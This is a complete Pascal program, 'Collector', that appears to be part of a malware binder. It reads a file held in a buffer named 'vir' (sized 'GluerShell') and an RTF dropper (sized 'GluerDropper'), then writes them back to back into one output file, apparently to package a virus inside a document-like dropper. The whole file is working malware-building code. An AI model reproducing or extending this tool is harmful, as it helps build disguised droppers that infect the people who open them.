program Collector;
uses
  windows;


const 
	{$i size.inc}
var fto1,Fto:file;
    filesize:integer;
    vir:array[0..GluerShell]of byte;
    rtf:array[0..GluerDropper]of byte;
procedure collect;
begin
     filemode:=0;
     assign(fto,paramstr(1));
     reset(fto,1);
     blockRead(fto,Vir,GluerShell);
     closefile(fto);
     assign(fto,paramstr(2));
     reset(fto,1);
     blockRead(fto,rtf,GluerDropper);
     close(fto);
     filemode:=1;
     assign(fto,paramstr(3));
     rewrite(fto,1);
     BlockWrite(fto,vir,GluerShell);
     seek(fto,GluerShell);
     BlockWrite(fto,Rtf,GluerDropper);
     closefile(fto);
end;
begin
    collect;

end.
